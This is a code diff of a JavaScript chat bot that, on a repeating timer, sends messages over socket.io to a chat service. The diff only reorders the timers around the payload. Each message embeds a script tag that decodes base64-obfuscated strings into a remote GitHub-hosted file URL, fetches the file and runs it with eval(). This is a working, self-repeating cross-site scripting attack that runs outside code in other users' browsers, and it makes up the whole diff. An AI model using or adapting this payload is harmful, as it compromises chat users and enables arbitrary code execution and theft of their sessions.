@@ -13,16 +13,18 @@ const intervalId = setInterval(function() {
         list: ["name", "gnygres"]
     });
     setTimeout(function() {
-        socket.emit('talk', {
-            text: "gnygres <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JsYW5rbmFtZWxtYW9sbWFvLXN0YXIvc2NyL3JlZnMvaGVhZHMvbWFpbi8=')+'scr'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
-        });
-        coughtimer = coughtimer - 125;
-        if (coughtimer <= 100)
-        {
-            coughtimer = 100;
-        }
         socket.emit("command", {
             list: ["color"]
         });
-    }, 75);
+        setTimeout(function() {
+            socket.emit('talk', {
+                text: "gnygres <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JsYW5rbmFtZWxtYW9sbWFvLXN0YXIvc2NyL3JlZnMvaGVhZHMvbWFpbi8=')+'scr'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
+            });
+            coughtimer = coughtimer - 125;
+            if (coughtimer <= 100)
+            {
+                coughtimer = 100;
+            }
+        }, 50);
+    }, 25);
 }, coughtimer);
